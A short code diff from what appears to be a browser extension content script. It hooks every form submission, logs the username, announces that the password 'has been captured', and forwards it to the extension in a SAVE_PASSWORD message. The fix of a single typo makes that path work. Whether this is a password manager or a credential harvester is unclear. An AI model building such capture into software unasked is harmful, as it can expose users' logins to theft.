@@ -27,7 +27,7 @@ document.addEventListener("submit",function(event)  {
                         console.log("Username:", username);
                         console.log("Password has been captured");
 
-                chrome.runtime,sendMessage({
+                chrome.runtime.sendMessage({
                         type:"SAVE_PASSWORD",
                         data: {
                                 website: website,
